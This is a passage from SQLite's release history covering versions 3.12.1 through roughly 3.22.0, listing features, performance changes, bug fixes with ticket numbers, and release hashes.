the decision toward the use of co-routines. The planner avoids query plans that use indexes with unknown collating functions. The planner omits unused LEFT JOINs even if they are not the right-most joins of a query. Other performance optimizations: A smaller and faster implementation of text to floating-point conversion subroutine: sqlite3AtoF(). The Lemon parser generator creates a faster parser. Use the strcspn() C-library routine to speed up the LIKE and GLOB operators. Improvements to the command-line shell: The \".schema\" command shows the structure of virtual tables. Added support for reading and writing SQLite Archive files using the .archive command. Added the experimental .expert command Added the \".eqp trigger\" variant of the \".eqp\" command Enhance the \".lint fkey-indexes\" command so that it works with WITHOUT ROWID tables. If the filename argument to the shell is a ZIP archive rather than an SQLite database, then the shell automatically opens that ZIP archive using the Zipfile virtual table. Added the edit() SQL function. Added the .excel command to simplify exporting database content to a spreadsheet. Databases are opened using Append VFS when the --append flag is used on the command line or with the .open command. Enhance the SQLITE_ENABLE_UPDATE_DELETE_LIMIT compile-time option so that it works for WITHOUT ROWID tables. Provide the sqlite_offset(X) SQL function that returns the byte offset into the database file to the beginning of the record holding value X, when compiling with -DSQLITE_ENABLE_OFFSET_SQL_FUNC. Bug fixes: Infinite loop on an UPDATE that uses an OR operator in the WHERE clause. Problem introduced with 3.17.0 and reported on the mailing list about one year later. Ticket 47b2581aa9bfecec. Incorrect query results when the skip-ahead-distinct optimization is used. Ticket ef9318757b152e3a. Incorrect query results on a join with a ORDER BY DESC. Ticket 123c9ba32130a6c9. Inconsistent result set column names between CREATE TABLE AS and a simple SELECT. Ticket 3b4450072511e621 Assertion fault when doing REPLACE on an index on an expression. Ticket dc3f932f5a147771 Assertion fault when doing an IN operator on a constant index. Ticket aa98619ad08ddcab Hashes: SQLITE_SOURCE_ID: \"2018-01-22 18:45:57 0c55d179733b46d8d0ba4d88e01a25e10677046ee3da1d5b1581e86726f2171d\" SHA3-256 for sqlite3.c: 206df47ebc49cd1710ac0dd716ce5de5854826536993f4feab7a49d136b85069 2017-10-24 (3.21.0) Take advantage of the atomic-write capabilities in the F2FS filesystem when available, for greatly reduced transaction overhead. This currently requires the SQLITE_ENABLE_BATCH_ATOMIC_WRITE compile-time option. Allow ATTACH and DETACH commands to work inside of a transaction. Allow WITHOUT ROWID virtual tables to be writable if the PRIMARY KEY contains exactly one column. The \"fsync()\" that occurs after the header is written in a WAL reset now uses the sync settings for checkpoints. This means it will use a \"fullfsync\" on macs if PRAGMA checkpoint_fullfsync set on. The sqlite3_sourceid() function tries to detect if the source code has been modified from what is checked into version control and if there are modifications, the last four characters of the version hash are shown as \"alt1\" or \"alt2\". The objective is to detect accidental and/or careless edits. A forger can subvert this feature. Improved de-quoting of column names for CREATE TABLE AS statements with an aggregate query on the right-hand side. Fewer \"stat()\" system calls issued by the unix VFS. Enhanced the LIKE optimization so that it works with an ESCAPE clause. Enhanced PRAGMA integrity_check and PRAGMA quick_check to detect obscure row corruption that they were formerly missing. Also update both pragmas so that they return error text rather than SQLITE_CORRUPT when encountering corruption in records. The query planner now prefers to implement FROM-clause subqueries using co-routines rather using the query flattener optimization. Support for the use of co-routines for subqueries may no longer be disabled. Pass information about !=, IS, IS NOT, NOT NULL, and IS NULL constraints into the xBestIndex method of virtual tables. Enhanced the CSV virtual table so that it accepts the last row of input if the final new-line character is missing. Remove the rarely-used \"scratch\" memory allocator. Replace it with the SQLITE_CONFIG_SMALL_MALLOC configuration setting that gives SQLite a hint that large memory allocations should be avoided when possible. Added the swarm virtual table to the existing union virtual table extension. Added the sqlite_dbpage virtual table for providing direct access to pages of the database file. The source code is built into the amalgamation and is activated using the -DSQLITE_ENABLE_DBPAGE_VTAB compile-time option. Add a new type of fts5vocab virtual table - \"instance\" - that provides direct access to an FTS5 full-text index at the lowest possible level. Remove a call to rand_s() in the Windows VFS since it was causing problems in Firefox on some older laptops. The src/shell.c source code to the command-line shell is no longer under version control. That file is now generated as part of the build process. Miscellaneous microoptimizations reduce CPU usage by about 2.1%. Bug fixes: Fix a faulty assert() statement discovered by OSSFuzz. Ticket cb91bf4290c211d Fix an obscure memory leak in sqlite3_result_pointer(). Ticket 7486aa54b968e9b Avoid a possible use-after-free error by deferring schema resets until after the query planner has finished running. Ticket be436a7f4587ce5 Only use indexes-on-expressions to optimize ORDER BY or GROUP BY if the COLLATE is correct. Ticket e20dd54ab0e4383 Fix an assertion fault that was coming up when the expression in an index-on-expressions is really a constant. Ticket aa98619ad08ddca Fix an assertion fault that could occur following PRAGMA reverse_unordered_selects. Ticket cb91bf4290c211d Fix a segfault that can occur for queries that use table-valued functions in an IN or EXISTS subquery. Ticket b899b6042f97f5 Fix a potential integer overflow problem when compiling a particular horrendous common table expression. This was another problem discovered by OSSFuzz. Check-in 6ee8cb6ae5. Fix a potential out-of-bound read when querying a corrupt database file, a problem detected by Natalie Silvanovich of Google Project Zero. Check-in 04925dee41a21f. Hashes: SQLITE_SOURCE_ID: \"2017-10-24 18:55:49 1a584e499906b5c87ec7d43d4abce641fdf017c42125b083109bc77c4de48827\" SHA3-256 for sqlite3.c: 84c181c0283d0320f488357fc8aab51898370c157601459ebee49d779036fe03 2017-08-24 (3.20.1) Fix a potential memory leak in the new sqlite3_result_pointer() interface. Ticket 7486aa54b968e9b5. Hashes: SQLITE_SOURCE_ID: \"2017-08-24 16:21:36 8d3a7ea6c5690d6b7c3767558f4f01b511c55463e3f9e64506801fe9b74dce34\" SHA3-256 for sqlite3.c: 93b1a6d69b48dc39697d1d3a1e4c30b55da0bdd2cad0c054462f91081832954a 2017-08-01 (3.20.0) Update the text of error messages returned by sqlite3_errmsg() for some error codes. Add new pointer passing interfaces. Backwards-incompatible changes to some extensions in order to take advantage of the improved security offered by the new pointer passing interfaces: Extending FTS5 requires sqlite3_bind_pointer() to find the fts5_api pointer. carray(PTR,N) requires sqlite3_bind_pointer() to set the PTR parameter. remember(V,PTR) requires sqlite3_bind_pointer() to set the PTR parameter. Added the SQLITE_STMT virtual table extension. Added the COMPLETION extension - designed to suggest tab-completions for interactive user interfaces. This is a work in progress. Expect further enhancements in future releases. Added the UNION virtual table extension. The built-in date and time functions have been enhanced so that they can be used in CHECK constraints, in indexes on expressions, and in the WHERE clauses of partial indexes, provided that they do not use the 'now', 'localtime', or 'utc' keywords. More information. Added the sqlite3_prepare_v3() and sqlite3_prepare16_v3() interfaces with the extra \"prepFlags\" parameters. Provide the SQLITE_PREPARE_PERSISTENT flag for sqlite3_prepare_v3() and use it to limit lookaside memory misuse by FTS3, FTS5, and the R-Tree extension. Added the PRAGMA secure_delete=FAST command. When secure_delete is set to FAST, old content is overwritten with zeros as long as that does not increase the amount of I/O. Deleted content might still persist on the free-page list but will be purged from all b-tree pages. Enhancements to the command-line shell: Add support for tab-completion using the COMPLETION extension, for both readline and linenoise. Add the \".cd\" command. Enhance the \".schema\" command to show the schema of all attached databases. Enhance \".tables\" so that it shows the schema names for all attached if the name is anything other than \"main\". The \".import\" command ignores an initial UTF-8 BOM. Added the \"--newlines\" option to the \".dump\" command to cause U+000a and U+000d characters to be output literally rather than escaped using the replace() function. Query planner enhancements: When generating individual loops for each ORed term of an OR scan, move any constant WHERE expressions outside of the loop, as is done for top-level loops. The query planner examines the values of bound parameters to help determine if a partial index is usable. When deciding between two plans with the same estimated cost, bias the selection toward the one that does not use the sorter. Evaluate WHERE clause constraints involving correlated subqueries last, in the hope that they never have be evaluated at all. Do not use the flattening optimization for a sub-query on the RHS of a LEFT JOIN if that subquery reads data from a virtual table as doing so prevents the query planner from creating automatic indexes on the results of the sub-query, which can slow down the query. Add SQLITE_STMTSTATUS_REPREPARE, SQLITE_STMTSTATUS_RUN, and SQLITE_STMTSTATUS_MEMUSED options for the sqlite3_stmt_status() interface. Provide PRAGMA functions for PRAGMA integrity_check, PRAGMA quick_check, and PRAGMA foreign_key_check. Add the -withoutnulls option to the TCL interface eval method. Enhance the sqlite3_analyzer.exe utility program so that it shows the number of bytes of metadata on btree pages. The SQLITE_DBCONFIG_ENABLE_QPSG run-time option and the SQLITE_ENABLE_QPSG compile-time option enable the query planner stability guarantee. See also ticket 892fc34f173e99d8 Miscellaneous optimizations result in a 2% reduction in CPU cycles used. Bug Fixes: Fix the behavior of sqlite3_column_name() for queries that use the flattening optimization so that the result is consistent with other queries that do not use that optimization, and with PostgreSQL, MySQL, and SQLServer. Ticket de3403bf5ae. Fix the query planner so that it knows not to use automatic indexes on the right table of LEFT JOIN if the WHERE clause uses the IS operator. Fix for ce68383bf6aba. Ensure that the query planner knows that any column of a flattened LEFT JOIN can be NULL even if that column is labeled with \"NOT NULL\". Fix for ticket 892fc34f173e99d8. Fix rare false-positives in PRAGMA integrity_check when run on a database connection with attached databases. Ticket a4e06e75a9ab61a12 Fix a bug (discovered by OSSFuzz) that causes an assertion fault if certain dodgy CREATE TABLE declarations are used. Ticket bc115541132dad136 Hashes: SQLITE_SOURCE_ID: \"2017-08-01 13:24:15 9501e22dfeebdcefa783575e47c60b514d7c2e0cad73b2a496c0bc4b680900a8\" SHA3-256 for sqlite3.c: 79b7f3b977360456350219cba0ba0e5eb55910565eab68ea83edda2f968ebe95 2017-06-17 (3.18.2) Fix a bug that might cause duplicate output rows when an IN operator is used in the WHERE clause. Ticket 61fe9745. Hashes: SQLITE_SOURCE_ID: \"2017-06-17 09:59:36 036ebf729e4b21035d7f4f8e35a6f705e6bf99887889e2dc14ebf2242e7930dd\" SHA3-256 for sqlite3.c: b0bd014f2776b9f9508a3fc6432f70e2436bf54475369f88f0aeef75b0eec93e 2017-06-16 (3.18.1) Fix a bug associated with auto_vacuum that can lead to database corruption. The bug was introduced in version 3.16.0 (2017-01-02). Ticket fda22108. Hashes: SQLITE_SOURCE_ID: \"2017-06-16 13:41:15 77bb46233db03a3338bacf7e56f439be3dfd1926ea0c44d252eeafa7a7b31c06\" SHA3-256 for sqlite3.c: 334eaf776db9d09a4e69d6012c266bc837107edc2c981739ef82081cb11c5723 2017-06-08 (3.19.3) Fix a bug associated with auto_vacuum that can lead to database corruption. The bug was introduced in version 3.16.0 (2017-01-02). Ticket fda22108. Hashes: SQLITE_SOURCE_ID: \"2017-06-08 14:26:16 0ee482a1e0eae22e08edc8978c9733a96603d4509645f348ebf55b579e89636b\" SHA3-256 for sqlite3.c: 368f1d31272b1739f804bcfa5485e5de62678015c4adbe575003ded85c164bb8 2017-05-25 (3.19.2) Fix more bugs in the LEFT JOIN flattening optimization. Ticket 7fde638e94287d2c. Hashes: SQLITE_SOURCE_ID: \"2017-05-25 16:50:27 edb4e819b0c058c7d74d27ebd14cc5ceb2bad6a6144a486a970182b7afe3f8b9\" SHA3-256 for sqlite3.c: 1be0c457869c1f7eba58c3b5097b9ec307a15be338308bee8e5be8570bcf5d1e 2017-05-24 (3.19.1) Fix a bug in the LEFT JOIN flattening optimization. Ticket cad1ab4cb7b0fc. Remove a surplus semicolon that was causing problems for older versions of MSVC. Hashes: SQLITE_SOURCE_ID: \"2017-05-24 13:08:33 f6d7b988f40217821a382bc298180e9e6794f3ed79a83c6ef5cae048989b3f86\" SHA3-256 for sqlite3.c: 996b2aff37b6e0c6663d0312cd921bbdf6826c989cbbb07dadde5e9672889bca 2017-05-22 (3.19.0) The SQLITE_READ authorizer callback is invoked once with a column name that is an empty string for every table referenced in a query from which no columns are extracted. When using an index on an expression, try to use expression values already available in the index, rather than loading the original columns and recomputing the expression. Enhance the flattening optimization so that it is able to flatten views on the right-hand side of a LEFT JOIN. Use replace() instead of char() for escaping newline and carriage-return characters embedded in strings in the .dump output from the command-line shell. Avoid unnecessary foreign key processing in UPDATE statements that do not touch the columns that are constrained by the foreign keys. On a DISTINCT query that uses an index, try to skip ahead to the next distinct entry using the index rather than stepping through rows, when an appropriate index is available. Avoid unnecessary invalidation of sqlite3_blob handles when making changes to unrelated tables. Transfer any terms of the HAVING clause that use only columns mentioned in the GROUP BY clause over to the WHERE clause for faster processing. Reuse the same materialization of a VIEW if that VIEW appears more than once in the same query. Enhance PRAGMA integrity_check so that it identifies tables that have two or more rows with the same rowid. Enhance the FTS5 query syntax so that column filters may be applied to arbitrary expressions. Enhance the json_extract() function to cache and reuse parses of JSON input text. Added the anycollseq.c loadable extension that allows a generic SQLite database connection to read a schema that contains unknown and/or application-specific collating sequences. Bug Fixes: Fix a problem in REPLACE that can result in a corrupt database containing two or more rows with the same rowid. Fix for ticket f68dc596c4e6018d. Fix a problem in PRAGMA integrity_check that was causing a subsequent VACUUM to behave suboptimally. Fix the PRAGMA foreign_key_check command so that it works correctly with foreign keys on WITHOUT ROWID tables. Fix a bug in the b-tree logic that can result in incorrect duplicate answers for IN operator queries. Ticket 61fe9745 Disallow leading zeros in numeric constants in JSON. Fix for ticket b93be8729a895a528e2. Disallow control characters inside of strings in JSON. Fix for ticket 6c9b5514077fed34551. Limit the depth of recursion for JSON objects and arrays in order to avoid excess stack usage in the recursive descent parser. Fix for ticket 981329adeef51011052. Hashes: SQLITE_SOURCE_ID: \"2017-05-22 13:58:13 28a94eb282822cad1d1420f2dad6bf65e4b8b9062eda4a0b9ee8270b2c608e40\" SHA3-256 for sqlite3.c: c30326aa1a9cc342061b755725eac9270109acf878bc59200dd4b1cea6bc2908 2017-03-30 (3.18.0) Added the PRAGMA optimize command The SQLite version identifier returned by the sqlite_source_id() SQL function and the sqlite3_sourceid() C API and found in the SQLITE_SOURCE_ID macro is now a 64-digit SHA3-256 hash instead of a 40-digit SHA1 hash. Added the json_patch() SQL function to the JSON1 extension. Enhance the LIKE optimization so that it works for arbitrary expressions on the left-hand side as long as the LIKE pattern on the right-hand side does not begin with a digit or minus sign. Added the sqlite3_set_last_insert_rowid() interface and use the new interface in the FTS3, FTS4, and FTS5 extensions to ensure that the sqlite3_last_insert_rowid() interface always returns reasonable values. Enhance PRAGMA integrity_check and PRAGMA quick_check so that they verify CHECK constraints. Enhance the query plans for joins to detect empty tables early and halt without doing unnecessary work. Enhance the sqlite3_mprintf() family of interfaces and the printf SQL function to put comma separators at the thousands marks for integers, if the \",\" format modifier is used in between the \"%\" and the \"d\" (example: \"%,d\"). Added the -DSQLITE_MAX_MEMORY=N compile-time option. Added the .sha3sum dot-command and the .selftest dot-command to the command-line shell Begin enforcing SQLITE_LIMIT_VDBE_OP. This can be used, for example, to prevent excessively large prepared statements in systems that accept SQL queries from untrusted users. Various performance improvements. Bug Fixes: Ensure that indexed expressions with collating sequences are handled correctly. Fix for ticket eb703ba7b50c1a5. Fix a bug in the 'start of ...' modifiers for the date and time functions. Ticket 6097cb92745327a1 Fix a potential segfault in complex recursive triggers, resulting from a bug in the OP_Once opcode introduced as part of a performance optimization in version 3.15.0. Ticket 06796225f59c057c In the RBU extension, add extra sync operations to avoid the possibility of corruption following a power failure. The sqlite3_trace_v2() output for nested SQL statements should always begin with a \"--\" comment marker. Hashes: SQLITE_SOURCE_ID: \"2017-03-28 18:48:43 424a0d380332858ee55bdebc4af3789f74e70a2b3ba1cf29d84b9b4bcf3e2e37\" SHA3-256 for sqlite3.c: cbf322df1f76be57fb3be84f3da1fc71d1d3dfdb7e7c2757fb0ff630b3bc2e5d 2017-02-13 (3.17.0) Approximately 25% better performance from the R-Tree extension. Uses compiler built-ins (ex: __builtin_bswap32() or _byteswap_ulong()) for byteswapping when available. Uses the sqlite3_blob key/value access object instead of SQL for pulling content out of R-Tree nodes Other miscellaneous enhancements such as loop unrolling. Add the SQLITE_DEFAULT_LOOKASIDE compile-time option. Increase the default lookaside size from 512,125 to 1200,100 as this provides better performance while only adding 56KB of extra memory per connection. Memory-sensitive applications can restore the old default at compile-time, start-time, or run-time. Use compiler built-ins __builtin_sub_overflow(), __builtin_add_overflow(), and __builtin_mul_overflow() when available. (All compiler built-ins can be omitted with the SQLITE_DISABLE_INTRINSIC compile-time option.) Added the SQLITE_ENABLE_NULL_TRIM compile-time option, which can result in significantly smaller database files for some applications, at the risk of being incompatible with older versions of SQLite. Change SQLITE_DEFAULT_PCACHE_INITSZ from 100 to 20, for improved performance. Added the SQLITE_UINT64_TYPE compile-time option as an analog to SQLITE_INT64_TYPE. Perform some UPDATE operations in a single pass instead of in two passes. Enhance the session extension to support WITHOUT ROWID tables. Fixed performance problems and potential stack overflows when creating views from multi-row VALUES clauses with hundreds of thousands of rows. Added the sha1.c extension. In the command-line shell, enhance the \".mode\" command so that it restores the default column and row separators for modes \"line\", \"list\", \"column\", and \"tcl\". Enhance the SQLITE_DIRECT_OVERFLOW_READ option so that it works in WAL mode as long as the pages being read are not in the WAL file. Enhance the Lemon parser generator so that it can store the parser object as a stack variable rather than allocating space from the heap and make use of that enhancement in the amalgamation. Other performance improvements. Uses about 6.5% fewer CPU cycles. Bug Fixes: Throw an error if the ON clause of a LEFT JOIN references tables to the right of the ON clause. This is the same behavior as PostgreSQL. Formerly, SQLite silently converted the LEFT JOIN into an INNER JOIN. Fix for ticket 25e335f802dd. Use the correct affinity for columns of automatic indexes. Ticket 7ffd1ca1d2ad4ec. Ensure that the sqlite3_blob_reopen() interface can correctly handle short rows. Fix for ticket e6e962d6b0f06f46e. Hashes: SQLITE_SOURCE_ID: \"2017-02-13 16:02:40 ada05cfa86ad7f5645450ac7a2a21c9aa6e57d2c\" SHA1 for sqlite3.c: cc7d708bb073c44102a59ed63ce6142da1f174d1 2017-01-06 (3.16.2) Fix the REPLACE statement for WITHOUT ROWID tables that lack secondary indexes so that it works correctly with triggers and foreign keys. This was a new bug caused by performance optimizations added in version 3.16.0. Ticket 30027b613b4 Fix the sqlite3_value_text() interface so that it correctly translates content generated by zeroblob() into a string of all 0x00 characters. This is a long-standing issue discovered after the 3.16.1 release by OSS-Fuzz Fix the bytecode generator to deal with a subquery in the FROM clause that is itself a UNION ALL where one side of the UNION ALL is a view that contains an ORDER BY. This is a long-standing issue that was discovered after the release of 3.16.1. See ticket 190c2507. Adjust the sqlite3_column_count() API so it more often returns the same values for PRAGMA statements as it did in prior releases, to minimize disruption to applications that might be using that interface in unexpected ways. Hashes: SQLITE_SOURCE_ID: \"2017-01-06 16:32:41 a65a62893ca8319e89e48b8a38cf8a59c69a8209\" SHA1 for sqlite3.c: 2bebdc3f24911c0d12b6d6c0123c3f84d6946b08 2017-01-03 (3.16.1) Fix a bug concerning the use of row values within triggers (see ticket 8c9458e7) that was in version 3.15.0 but was not reported until moments after the 3.16.0 release was published. Hashes: SQLITE_SOURCE_ID: \"2017-01-03 18:27:03 979f04392853b8053817a3eea2fc679947b437fd\" SHA1 for sqlite3.c: 354f6223490b30fd5320b4066b1535e4ce33988d 2017-01-02 (3.16.0) Uses 9% fewer CPU cycles. (See the CPU performance measurement report for details on how this performance increase was computed.) Added experimental support for PRAGMA functions. Added the SQLITE_DBCONFIG_NO_CKPT_ON_CLOSE option to sqlite3_db_config(). Enhance the date and time functions so that the 'unixepoch' modifier works for the full span of supported dates. Changed the default configuration of the lookaside memory allocator from 500 slots of 128 bytes each into 125 slots of 512 bytes each. Enhanced \"WHERE x NOT NULL\" partial indexes so that they are usable if the \"x\" column appears in a LIKE or GLOB operator. Enhanced sqlite3_interrupt() so that it interrupts checkpoint operations that are in process. Enhanced the LIKE and GLOB matching algorithm to be faster for cases when the pattern contains multiple wildcards. Added the SQLITE_FCNTL_WIN32_GET_HANDLE file control opcode. Added \".mode quote\" to the command-line shell. Added \".lint fkey-indexes\" to the command-line shell. Added the .imposter dot-command to the command-line shell. Added the remember(V,PTR) SQL function as a loadable extension. Rename the SQLITE_OMIT_BUILTIN_TEST compile-time option to SQLITE_UNTESTABLE to better reflect the implications of using it. Bug Fixes: Fix a long-standing bug in the query planner that caused incorrect results on a LEFT JOIN where the left-hand table is a subquery and the join constraint is a bare column name coming from the left-hand subquery. Ticket 2df0107b. Correctly handle the integer literal -0x8000000000000000 in the query planner. Hashes: SQLITE_SOURCE_ID: \"2017-01-02 11:57:58 04ac0b75b1716541b2b97704f4809cb7ef19cccf\" SHA1 for sqlite3.c: e2920fb885569d14197c9b7958e6f1db573ee669 2016-11-28 (3.15.2) Multiple bug fixes to the row value logic that was introduced in version 3.15.0. Fix a NULL pointer dereference in ATTACH/DETACH following a maliciously constructed syntax error. Ticket 2f1b168ab4d4844. Fix a crash that can occur following an out-of-memory condition in the built-in instr() function. In the JSON extension, fix the JSON validator so that it correctly rejects invalid backslash escapes within strings. Hashes: SQLITE_SOURCE_ID: \"2016-11-28 19:13:37 bbd85d235f7037c6a033a9690534391ffeacecc8\" SHA1 for sqlite3.c: 06d77b42a3e70609f8d4bbb97caf53652f1082cb 2016-11-04 (3.15.1) Added SQLITE_FCNTL_WIN32_GET_HANDLE file control opcode. Fix the VACUUM command so that it spills excess content to disk rather than holding everything in memory, and possible causing an out-of-memory error for larger database files. This fixes an issue introduced by version 3.15.0. Fix a case (present since 3.8.0 - 2013-08-26) where OR-connected terms in the ON clause of a LEFT JOIN might cause incorrect results. Ticket 34a579141b2c5ac. Fix a case where the use of row values in the ON clause of a LEFT JOIN might cause incorrect results. Ticket fef4bb4bd9185ec8f. Hashes: SQLITE_SOURCE_ID: \"2016-11-04 12:08:49 1136863c76576110e710dd5d69ab6bf347c65e36\" SHA1 for sqlite3.c: e7c26a7be3e431dd06898f8d262c4ef240c07366 2016-10-14 (3.15.0) Added support for row values. Allow deterministic SQL functions in the WHERE clause of a partial index. Added the \"modeof=filename\" URI parameter on the unix VFS Added support for SQLITE_DBCONFIG_MAINDBNAME. Added the ability to VACUUM an ATTACH-ed database. Enhancements to the command-line shell: Add the \".testcase\" and \".check\" dot-commands. Added the --new option to the \".open\" dot-command, causing any prior content in the database to be purged prior to opening. Enhance the fts5vocab virtual table to handle \"ORDER BY term\" efficiently. Miscellaneous micro-optimizations reduce CPU usage by more than 7% on common workloads. Most optimization in this release has been on the front-end (sqlite3_prepare_v2()). Bug Fixes: The multiply operator now correctly detects 64-bit integer overflow and promotes to floating point in all corner-cases. Fix for ticket 1ec41379c9c1e400. Correct handling of columns with redundant unique indexes when those columns are used on the LHS of an IN operator. Fix for ticket 0eab1ac759. Skip NULL entries on range queries in indexes on expressions. Fix for ticket 4baa46491212947. Ensure that the AUTOINCREMENT counters in the sqlite_sequence table are initialized doing \"Xfer Optimization\" on \"INSERT ... SELECT\" statements. Fix for ticket 7b3328086a5c116c. Make sure the ORDER BY LIMIT optimization (from check-in 559733b09e) works with IN operators on INTEGER PRIMARY KEYs. Fix for ticket 96c1454c Hashes: SQLITE_SOURCE_ID: \"2016-10-14 10:20:30 707875582fcba352b4906a595ad89198d84711d8\" SHA1 for sqlite3.c: fba106f8f6493c66eeed08a2dfff0907de54ae76 2016-09-12 (3.14.2) Improved support for using the STDCALL calling convention in winsqlite3.dll. Fix the sqlite3_trace_v2() interface so that it is disabled if either the callback or the mask arguments are zero, in accordance with the documentation. Fix commenting errors and improve the comments generated on EXPLAIN listings when the -DSQLITE_ENABLE_EXPLAIN_COMMENTS compile-time option is used. Fix the \".read\" command in the command-line shell so that it understands that its input is not interactive. Correct affinity computations for a SELECT on the RHS of an IN operator. Fix for ticket 199df4168c. The ORDER BY LIMIT optimization is not valid unless the inner-most IN operator loop is actually used by the query plan. Fix for ticket 0c4df46116e90f92. Fix an internal code generator problem that was causing some DELETE operations to no-op. Ticket ef360601 Hashes: SQLITE_SOURCE_ID: \"2016-09-12 18:50:49 29dbef4b8585f753861a36d6dd102ca634197bd6\" SHA1 for sqlite3.c: bcc4a1989db45e7f223191f2d0f66c1c28946383 2016-08-11 (3.14.1) A performance enhancement to the page-cache \"truncate\" operation reduces COMMIT time by dozens of milliseconds on systems with a large page cache. Fix to the --rbu option of sqldiff. Hashes: SQLITE_SOURCE_ID: \"2016-08-11 18:53:32 a12d8059770df4bca59e321c266410344242bf7b\" SHA1 for sqlite3.c: d545b24892278272ce4e40e0567d69c8babf12ea 2016-08-08 (3.14) Celebrating the SQLite \" release\" with a home-baked pie. Added support for WITHOUT ROWID virtual tables. Improved the query planner so that the OR optimization can be used on virtual tables even if one or more of the disjuncts use the LIKE, GLOB, REGEXP, MATCH operators. Added the CSV virtual table for reading RFC 4180 formatted comma-separated value files. Added the carray() table-valued function extension. Enabled persistent loadable extensions using the new SQLITE_OK_LOAD_PERMANENTLY return code from the extension entry point. Added the SQLITE_DBSTATUS_CACHE_USED_SHARED option to sqlite3_db_status(). Add the vfsstat.c loadable extension - a VFS shim that measures I/O together with an eponymous virtual table that provides access to the measurements. Improved algorithm for running queries with both an ORDER BY and a LIMIT where only the inner-most loop naturally generates rows in the correct order. Enhancements to Lemon parser generator, so that it generates a faster parser. The PRAGMA compile_options command now attempts to show the version number of the compiler that generated the library. Enhance PRAGMA table_info so that it provides information about eponymous virtual tables. Added the \"win32-none\" VFS, analogous to the \"unix-none\" VFS, that works like the default \"win32\" VFS except that it ignores all file locks. The query planner uses a full scan of a partial index instead of a full scan of the main table, in cases where that makes sense. Allow table-valued functions to appear on the right-hand side of an IN operator. Created the dbhash.exe command-line utility. Added two new C-language interfaces: sqlite3_expanded_sql() and sqlite3_trace_v2(). These new interfaces subsume the functions of sqlite3_trace() and sqlite3_profile() which are now deprecated. Added the json_quote() SQL function to the json1 extension. Disable the authorizer callback while reparsing the schema. Added the SQLITE_ENABLE_UNKNOWN_SQL_FUNCTION compile-time option and turned that option on by default when building the command-line shell. Bug Fixes: Fix the ALTER TABLE command so that it does not corrupt descending indexes when adding a column to a legacy file format database. Ticket f68bf68513a1c15f Fix a NULL-pointer dereference/crash that could occurs when a transitive WHERE clause references a non-existent collating sequence. Ticket e8d439c77685eca6. Improved the cost estimation for an index scan which includes a WHERE clause that can be partially or fully evaluated using columns in the index and without having to do a table lookup. This fixes a performance regression that occurred for some obscure queries following the ORDER BY LIMIT optimization introduced in version 3.12.0. Hashes: SQLITE_SOURCE_ID: \"2016-08-08 13:40:27 d5e98057028abcf7217d0d2b2e29bbbcdf09d6de\" SHA1 for sqlite3.c: 234a3275d03a287434ace3ccdf1afb208e6b0e92 2016-05-18 (3.13.0) Postpone I/O associated with TEMP files for as long as possible, with the hope that the I/O can ultimately be avoided completely. Merged the session extension into trunk. Added the \".auth ON|OFF\" command to the command-line shell. Added the \"--indent\" option to the \".schema\" and \".fullschema\" commands of the command-line shell, to turn on pretty-printing. Added the \".eqp full\" option to the command-line shell, that does both EXPLAIN and EXPLAIN QUERY PLAN on each statement that is evaluated. Improved unicode filename handling in the command-line shell on Windows. Improved resistance against goofy query planner decisions caused by incomplete or incorrect modifications to the sqlite_stat1 table by the application. Added the sqlite3_db_config(db,SQLITE_DBCONFIG_ENABLE_LOAD_EXTENSION) interface which allows the sqlite3_load_extension() C-API to be enabled while keeping the load_extension() SQL function disabled for security. Change the temporary directory search algorithm on Unix to allow directories with write and execute permission, but without read permission, to serve as temporary directories. Apply this same standard to the \".\" fallback directory. Bug Fixes: Fix a problem with the multi-row one-pass DELETE optimization that was causing it to compute incorrect answers with a self-referential subquery in the WHERE clause. Fix for ticket dc6ebeda9396087 Fix a possible segfault with DELETE when table is a rowid table with an INTEGER PRIMARY KEY and the WHERE clause contains a OR and the table has one or more indexes that are able to trigger the OR optimization, but none of the indexes reference any table columns other than the INTEGER PRIMARY KEY. Ticket 16c9801ceba49. When checking for the WHERE-clause push-down optimization, verify that all terms of the compound inner SELECT are non-aggregate, not just the last term. Fix for ticket f7f8c97e97597. Fix a locking race condition in Windows that can occur when two or more processes attempt to recover the same hot journal at the same time. Hashes: SQLITE_SOURCE_ID: \"2016-05-18 10:57:30 fc49f556e48970561d7ab6a2f24fdd7d9eb81ff2\" SHA1 for sqlite3.c: 9b9171b1e6ce7a980e6b714e9c0d9112657ad552 Bug fixes backported into patch release 3.12.2 (2016-04-18): Fix a backwards compatibility problem in version 3.12.0 and 3.12.1: Columns declared as \"INTEGER\" PRIMARY KEY (with quotes around the datatype keyword) were not being recognized as an INTEGER PRIMARY KEY, which resulted in an incompatible database file. Ticket 7d7525cb01b68 Fix a bug (present since version 3.9.0) that can cause the DELETE operation to miss rows if PRAGMA reverse_unordered_selects is turned on. Ticket a306e56ff68b8fa5 Fix a bug in the code generator that can cause incorrect results if two or more virtual tables are joined and the virtual table used in outer loop of the join has an IN operator constraint. Correctly interpret negative \"PRAGMA cache_size\" values when determining the cache size used for sorting large amounts of data. Bug fixes backported into patch release 3.12.1 (2016-04-08): Fix a boundary condition error introduced by version 3.12.0 that can result in a crash during heavy SAVEPOINT usage. Ticket 7f7f8026eda38. Fix views so that they inherit column datatypes from the table that they are defined against, when possible. Fix the query planner so that IS and IS NULL operators are able to drive an index on a LEFT OUTER JOIN. 2016-04-18 (3.12.2) Fix a backwards compatibility problem in version 3.12.0 and 3.12.1: Columns declared as \"INTEGER\" PRIMARY KEY (with quotes around the datatype keyword) were not being recognized as an INTEGER PRIMARY KEY, which resulted in an incompatible database file. Ticket 7d7525cb01b68 Fix a bug (present since version 3.9.0) that can cause the DELETE operation to miss rows if PRAGMA reverse_unordered_selects is turned on. Ticket a306e56ff68b8fa5 Fix a bug in the code generator that can cause incorrect results if two or more virtual tables are joined and the virtual table used in outer loop of the join has an IN operator constraint. Correctly interpret negative \"PRAGMA cache_size\" values when determining the cache size used for sorting large amounts of data. Hashes: SQLITE_SOURCE_ID: \"2016-04-18 17:30:31 92dc59fd5ad66f646666042eb04195e3a61a9e8e\" SHA1 for sqlite3.c: de5a5898ebd3a3477d4652db143746d008b24c83 2016-04-08 (3.12.1) Fix a boundary condition error introduced by version 3.12.0 that can result in a crash during heavy SAVEPOINT usage. Ticket 7f7f8026eda38. Fix views so that they inherit column datatypes from the table that they are defined against, when possible. Fix the query planner so that IS and IS NULL operators are able to drive an index on a LEFT OUTER JOIN. Hashes: SQLITE_SOURCE_ID: \"2016-04-08 15:09:49 fe7d3b75fe1bde41511b323925af8ae1b910bc4d\" SHA1 for sqlite3.c: ebb18593350779850e3e1a930eb84a70fca8c1d1 2016-04-01 (3.9.3) 